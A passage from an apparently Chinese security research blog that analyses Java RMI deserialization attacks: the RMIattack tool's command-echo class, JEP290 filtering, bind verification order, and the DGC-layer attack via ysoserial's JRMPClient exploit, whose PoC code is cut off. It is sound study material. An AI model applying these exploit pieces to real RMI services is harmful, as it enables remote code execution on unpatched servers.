<p>这个ysoserial用动态代理去实现remote接口封装payload的操作真的让我迷惑了好久，我一直以为服务端payload触发和动态代理的特性有关(由于CC链是这样的，想当然这样了)。网上的文章大多一笔带过，这边再次感谢0kami大佬QAQ，沟通是真的解惑。</p>
</blockquote>
<h3 id="RMIattack-Bind-回显"><a href="#RMIattack-Bind-回显" class="headerlink" title="RMIattack - Bind + 回显"></a>RMIattack - Bind + 回显</h3><p> 在反序列化利用的时候，常常遇到你一个payload打过去，但是对方没反应，你也不知道对方执行了命令没有。命令执行结果回显一直是一个很头疼的问题。RMIattack工具解决了命令回显的问题。</p>
<p>这个工具在Ysoserial-RMIRegistryExploit模块的基础上（同样是用动态调用封装payload至remote接口类，并且使用的是CC1的payload）通过写入了一个class文件，再调用class文件来执行系统命令的形式，实现命令回显。我们简单看下实现过程。</p>
<p>其攻击步骤主要分为两部分：</p>
<ol>
<li><p>先判断系统类型：windows，linux，然后写入一个文件再临时目录。（这里修改了CC链的底层调用函数，yso默认是调用Runtime.getRuntime().exec()，这边改成了write()方法）</p>
<ul>
<li>windows的话生成文件<code>c:/windows/temp/ErrorBaseExec.class</code></li>
<li>linux的话生成<code>/tmp/ErrorBaseExec.class</code></li>
</ul>
</li>
<li><p>根据操作系统类型，从固定路径loadclass加载class，然后调用其do_exec方法，传入要执行的命令。执行的命令结果会写在抛出异常中，服务器通过异常抛出传输执行结果到客户端，然后客户端解析报错信息获取命令执行结果。</p>
</li>
</ol>
<p>由于在工具代码中，写入的文件直接被写成字节串了，这边可以自己打一下自己，来拿到被写入的文件<code>ErrorBaseExec.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorBaseExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ErrorBaseExec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//解析</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readBytes</span><span class="params">(InputStream var0)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedReader var1 = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(var0));</span><br><span class="line">        StringBuffer var2 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        String var3;</span><br><span class="line">        <span class="keyword">while</span>((var3 = var1.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var2.append(var3).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var4 = var2.toString();</span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_exec</span><span class="params">(String var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//执行命令</span></span><br><span class="line">            Process var1 = Runtime.getRuntime().exec(var0);</span><br><span class="line">            <span class="comment">//解析执行结果</span></span><br><span class="line">            String var2 = readBytes(var1.getInputStream());</span><br><span class="line">            <span class="comment">//抛出异常到客户端</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"8888:"</span> + var2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var3.toString().indexOf(<span class="string">"8888"</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"8888:"</span> + <span class="keyword">new</span> String(var3.toString()) + <span class="string">"\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        do_exec(<span class="string">"cmd /c dir"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写入文件，在调用文件，通过报错信息传递命令执行结果，也算是一种思路。</p>
<h3 id="JEP290修复"><a href="#JEP290修复" class="headerlink" title="JEP290修复"></a>JEP290修复</h3><p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。</p>
<p>在8u112，使用cc链5打一波，可以正常攻击</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wsgxjjj311d0qpai3.jpg" alt="jep290-8u112.png"></p>
<p>在8u161，使用cc链5攻击，就不可以了:<code>REJECTED</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wx05oxj31qs07agm4.jpg" alt="jep290-8u161.png"></p>
<p>在<code>sun.rmi.registry.RegistryImpl#registryFilter</code>处下断点，然后开始调试，往回看，可以发现过滤器是在<code>obj.readObject()</code>语句中的JDK底层进入的，这是JEP在底层实现过滤机制导致的。反序列化动作和过滤器机制都在readObject语句中，这样就不存在逻辑上的跳过、绕过过滤器。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16x44656j31hr102q9s.jpg" alt="registryFilter.png"></p>
<p>看<code>sun.rmi.registry.RegistryImpl#registryFilter</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title">registryFilter</span><span class="params">(FilterInfo var0)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这里registryFilter为空跳过该判断</span></span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Status var1 = registryFilter.checkInput(var0);</span><br><span class="line">        <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不允许输入流的递归层数超过20层，超过就报错</span></span><br><span class="line">    <span class="keyword">if</span> (var0.depth() &gt; <span class="number">20L</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//获取输入流序列化class类型到var2</span></span><br><span class="line">        Class var2 = var0.serialClass();</span><br><span class="line">        <span class="comment">//判断是否为null，null就报错</span></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//判断是否为数组类型</span></span><br><span class="line">            <span class="keyword">if</span> (var2.isArray()) &#123;</span><br><span class="line">                <span class="comment">//数组长度大于10000就报错</span></span><br><span class="line">                <span class="keyword">if</span> (var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="number">10000L</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//获取到数组中的成分类，假如是还是数组嵌套，继续获取</span></span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    var2 = var2.getComponentType();</span><br><span class="line">                &#125; <span class="keyword">while</span>(var2.isArray());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断是不是JAVA基元类型，就是 绕过Object类型参数 小章中的那些基本类</span></span><br><span class="line">            <span class="comment">//是基本类就允许</span></span><br><span class="line">            <span class="keyword">if</span> (var2.isPrimitive()) &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//判断我们的输入的序列化类型是否为以下的几类class白名单之中</span></span><br><span class="line">                <span class="comment">//如果我们输入的类属于下面这些白名单的类或超类，就返回ALLOWED</span></span><br><span class="line">                <span class="comment">//不然就返回REJECTED报错。</span></span><br><span class="line">                <span class="keyword">return</span> String.class != var2 &amp;&amp; </span><br><span class="line">                    !Number.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !Remote.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !Proxy.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !ActivationID.class.isAssignableFrom(var2) &amp;&amp; </span><br><span class="line">                    !UID.class.isAssignableFrom(var2) ? </span><br><span class="line">                    Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>但是我们发现我们传入的payload object是一个Remote.class接口呀，这样不是就是在白名单了么。</p>
<p>实际上一开始是可以通过过滤器检测，但是readobject会把对象一层层递归拆开一个个经过过滤器检查，最后在<code>AnnotationInvocationHandler</code>处就被白名单拦下来了。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16xsae5tj31bs0kz0u0.jpg" alt="reject.png"></p>
<p>也没有说有哪个链的payload刚好可以通过白名单，所以在JEP290之后对于注册端的攻击就被拦截了。</p>
<h3 id="注册端对于服务端地址校验的变动"><a href="#注册端对于服务端地址校验的变动" class="headerlink" title="注册端对于服务端地址校验的变动"></a>注册端对于服务端地址校验的变动</h3><p>在 RMI 反序列化一文中，我们有实验过：在默认情况下，服务端向注册端进行bind等操作，是会验证服务端地址是否被注册端允许的（默认是只信任本机地址）。</p>
<p>但是我们在上面利用过程中，<strong>攻击者（服务端）都不是受害者（注册端）的信任地址，为何没有被这个验证机制所拦截呢？</strong></p>
<p>原因是因为，这个<strong>注册端对于服务端的验证在反序列化操作之后</strong>：</p>
<p>我们以8u112为例来看代码：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16z6m443j314y0g70ua.jpg" alt="8u111服务端验证.png"></p>
<p><code>sun.rmi.registry.RegistryImpl#bind</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">	<span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//此处验证</span></span><br><span class="line">	checkAccess(<span class="string">"Registry.bind"</span>);</span><br><span class="line">	<span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">		Remote curr = bindings.get(name);</span><br><span class="line">		<span class="keyword">if</span> (curr != <span class="keyword">null</span>)</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> AlreadyBoundException(name);</span><br><span class="line">		bindings.put(name, obj);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在8u141之后，JDK代码对于此处验证逻辑发生了变化：变成<strong>先验证再反序列化操作</strong>了，等于服务端攻击注册端变为不可用。</p>
<p>我们来看161与112的对比情况</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16zoxt9zj324i0hhn10.jpg" alt="161-112对比.png"></p>
<p>那么单单从验证服务端逻辑来说，8u141之后，服务端bind之类的打注册端变得不可利用。但是客户端lookup打注册端因为不需要验证，不受这个变动影响。</p>
<p>但是对比上面的版本JEP290的封堵，自从8u121，客户端lookup打，服务单bind打就都不可利用了。这边的改动其实意义不大，但是还是之前注意到过，领出来提一下。</p>
<blockquote>
<p>但是假如可以JEP290绕过了，这里就变得非常有意思了，8u141之后lookup可以利用，bind不能利用。</p>
</blockquote>
<h2 id="RMI-DGC层反序列化"><a href="#RMI-DGC层反序列化" class="headerlink" title="RMI DGC层反序列化"></a>RMI DGC层反序列化</h2><blockquote>
<p>网上的文章讲到RMI的DGC层，经常总结说到：是为了绕过RMI注册端jdk8u121后出现的白名单限制才出现的。</p>
<p>这也是对的，但是也不是完全对。一开始我也是因为ysoserial中的exploit模块和payload模块弄混了搞不清楚。在开始前我们需要区分：</p>
<p>ysoserial的payload JRMPClient 是为了绕过jdk8u121后出现的白名单限制。这利用到了DGC层，所以上面句话也是对的。</p>
<p>ysoserial的exploit JRMPClient 是可以直接利用DGC层攻击RMI注册端的，其基础原理跟ysoserial-RMIRegistryExploit几乎是一样的。同时这种攻击方式是绕过不过jdk8u121的。</p>
<p>我们接下来讲到的是 ysoserial的exploit JRMPClient。而payload JRMPClient与绕过jdk8u121将在下篇说到。</p>
</blockquote>
<h3 id="DGC客户端打DGC服务端"><a href="#DGC客户端打DGC服务端" class="headerlink" title="DGC客户端打DGC服务端"></a>DGC客户端打DGC服务端</h3><p>我们先来看与Bind攻击类似的另外一条更为底层的攻击路径：ysoserial的exploit JRMPClient 。</p>
<p>先来演示下攻击效果：依旧是8u111的ServerAndRegister起服务端 ，客户端使用yso的exploit JRMPClient 模块</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17020r99j31a00ojgnn.jpg" alt="exploit-JRMPClient.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg170jw0glj31230ddgns.jpg" alt="JRMP-8u111.png"></p>
<p>可以攻击成功。</p>
<p>那么回过头来看看原理：<a href="https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html" target="_blank" rel="noopener">DGC（Distributed Garbage Collection）——分布式垃圾回收机制</a>。</p>
<p>这个DGC是用于<strong>维护服务端中被客户端使用的远程引用才存在的</strong>。其中包括两个方法<strong>dirty</strong>和<strong>clean</strong>，简单来说：</p>
<ul>
<li>客户端想要使用服务端上的远程引用，使用dirty方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li>
<li>客户端不使用的时候，需要调用clean方法来清楚这个远程引用。</li>
</ul>
<p>由于我们的RMI服务就是基于远程引用的，其底层的远程引用维护就是就是使用DGC，起一个RMI服务必有DGC层。于是我们就打这个DGC服务。</p>
<blockquote>
<p>相对于RMIRegistryExploit模块，这个模块攻击范围更广因为RMI服务端或者RMI注册端都会开启DGC服务端。</p>
</blockquote>
<p>看看DGC服务端最后是哪里触发了反序列化执行：<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code></p>
<p>（跟<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>）极其类似</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="keyword">int</span> var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//一样是一个dispatch用于分发作用的方法</span></span><br><span class="line">    <span class="comment">//固定接口hash校验</span></span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SkeletonMismatchException(<span class="string">"interface hash mismatch"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DGCImpl var6 = (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="keyword">long</span> var8;</span><br><span class="line">        <span class="comment">//判断dirty和clean分支流</span></span><br><span class="line">        <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="comment">//clean分支流</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="keyword">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//从客户端提供的输入流取值</span></span><br><span class="line">                    ObjectInput var14 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//对于取值进行反序列化，***漏洞触发点***</span></span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line">			  <span class="comment">//进行clean操作，已经完成了攻击，之后操作已经不重要了。</span></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//..省略部分无关操作</span></span><br><span class="line">            <span class="comment">//dirty方法分支流，跟clean在漏洞触发点上是一样没差的</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//从客户端提供的输入流取值</span></span><br><span class="line">                    ObjectInput var13 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//对于取值进行反序列化，***漏洞触发点***</span></span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Lease var11 = var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">               <span class="comment">//..省略无关操作</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"invalid method number"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>一致的漏洞触发点，没问题。可以看到这里触发点的话无论是选dirty那条线还是clean那条线都是一样的。</p>
<p>那客户端怎样与服务端通讯呢，之前RMIRegistryExploit是<code>bind（name,payload）</code>这里插入payload，然后传输到服务端。</p>
<p><strong>DGC这里我们客户端在哪里可以插入payload？</strong></p>
<p>此处我自己并没有找到一个与<code>bind()</code>类似的封装好的方法，可以方便我们调试的直接发起一个DGC层的请求。但是我们在<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>处下一个断点，然后在<code>sun.rmi.transport.DGCImpl#dirty</code>下一个断点，调试github上的ServerAndRegister.java就可以得到这个DGC层的通讯客户端-服务端的过程（是在bind()绑定对象的时候产生的通讯）</p>
<blockquote>
<p>跟RMI-register这些一样，DGCImpl_Skel是服务端代码，DGCImpl_Stub是客户端代码；但是这两个class也跟我们之前说的一样（动态生成？），总之是无法下断点调试的。所以在其内部调用的其他方法下断点来调试。</p>
<p>然后感谢<a href="https://www.anquanke.com/post/id/204740" target="_blank" rel="noopener">这个老哥</a>给了个例子，客户端lookup也会产生DGC通讯。（其实大多操作都会有DGC，这里抄一下放在github中嘿嘿）但是仍然先来看ServerAndRegister.java的通讯</p>
</blockquote>
<p>DGC客户端处：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg170wu8s1j31lp0zbjww.jpg" alt="DGC客户端.png"></p>
<p>DGC服务端处：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg1712vjb7j31p20xrdl8.jpg" alt="DGC服务端.png"></p>
<p>根据客户端调用栈来回退到<code>DGCImpl_Stub</code>的<code>dirty</code>方法，去看应该在哪里插入payload（clean其实也一样）就看<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>好了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Lease <span class="title">dirty</span><span class="params">(ObjID[] var1, <span class="keyword">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//开启了一个连接，似曾相识的 669196253586618813L 在服务端也有</span></span><br><span class="line">            RemoteCall var5 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取连接的输入流</span></span><br><span class="line">                ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">                <span class="comment">//写入一个对象，在实现的本意中，这里是一个ID的对象列表ObjID[]</span></span><br><span class="line">                <span class="comment">//***这里就是我们payload写入的地方***</span></span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                <span class="comment">//------</span></span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">            Lease var24;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInput var9 = var5.getInputStream();</span><br><span class="line">                var24 = (Lease)var9.readObject();</span><br><span class="line">            <span class="comment">//省略大量错误处理..</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们就找到了DGC客户端该放payload的地方，和DGC服务端触发反序列化的地方。</p>
<p>接下就是去实现一个POC，把payload放进去。可以发现我们去寻找的DGC客户端该放payload的地方调用栈很深，这代表着我们从顶层开始传输payload一直到我们想要放置payload的参数，payload不变可能性极低或难度极大。所以针对这种很底层的payload的poc构建通常使用自实现一个客户端去拼接序列化数据包。</p>
<p>Ysoserial的JRMP-Client exploit模块就是这么实现的，其核心在于<code>makeDGCCall</code>方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入目标RMI注册端（也是DGC服务端）的IP端口，以及攻击载荷的payload对象。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeDGCCall</span> <span class="params">( String hostname, <span class="keyword">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException </span>&#123;</span><br><span class="line">        InetSocketAddress isa = <span class="keyword">new</span> InetSocketAddress(hostname, port);</span><br><span class="line">        Socket s = <span class="keyword">null</span>;</span><br><span class="line">        DataOutputStream dos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//建立一个socket通道，并为赋值</span></span><br><span class="line">            s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">            s.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">            s.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line">		   <span class="comment">//读取socket通道的数据流</span></span><br><span class="line">            OutputStream os = s.getOutputStream();</span><br><span class="line">            dos = <span class="keyword">new</span> DataOutputStream(os);</span><br><span class="line">		   <span class="comment">//*******开始拼接数据流*********</span></span><br><span class="line">            <span class="comment">//以下均为特定协议格式常量，之后会说到这些数据是怎么来的</span></span><br><span class="line">            <span 